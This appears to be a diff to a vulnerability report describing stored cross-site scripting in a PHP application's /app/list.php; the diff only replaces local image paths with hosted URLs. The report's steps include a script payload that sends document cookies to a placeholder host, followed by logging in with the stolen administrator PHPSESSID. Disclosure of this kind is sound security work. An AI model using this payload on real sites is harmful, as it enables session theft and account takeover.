@@ -38,31 +38,31 @@ The `/app/list.php` component fails to sanitize user-controllable input fields (
 
 1. 需要先注册一个用户，然后登入到系统。
 
-![image-20250313235009389](./image-20250313235009389.png)
+![image-20250313235009389](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313235009389.png?x-oss-process=style/img-to-webp)
 
 2. Navigate to the registration page: `http://[target]/app/register.php`.  
 
 3. Inject a malicious payload into a vulnerable input field (e.g., `<script>fetch('http://[ip]/?cookie=' + encodeURIComponent(document.cookie));</script>`).  
 
-![image-20250313235954178](./image-20250313235954178.png)
+![image-20250313235954178](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313235954178.png?x-oss-process=style/img-to-webp)
 
 3. Submit the registration  Room form.  
 
-![image-20250314002029758](./image-20250314002029758.png)
+![image-20250314002029758](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314002029758.png?x-oss-process=style/img-to-webp)
 
 4. The payload is stored in the database.  
 
 5. When an administrator or user views the affected data (/app/list.php), the script executes.  然后获取到管理员的PHPSESSID.
 
-![image-20250314000638889](./image-20250314000638889.png)
+![image-20250314000638889](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314000638889.png?x-oss-process=style/img-to-webp)
 
 6. 使用管理员的PHPSESSID登陆系统。
 
-![image-20250314001022390](./image-20250314001022390.png)
+![image-20250314001022390](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314001022390.png?x-oss-process=style/img-to-webp)
 
 **Observed Result:**  
 
-![image-20250314001207922](./image-20250314001207922.png)
+![image-20250314001207922](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250314001207922.png?x-oss-process=style/img-to-webp)
 
 **Expected Result:**  
 User input should be sanitized to prevent script execution.  
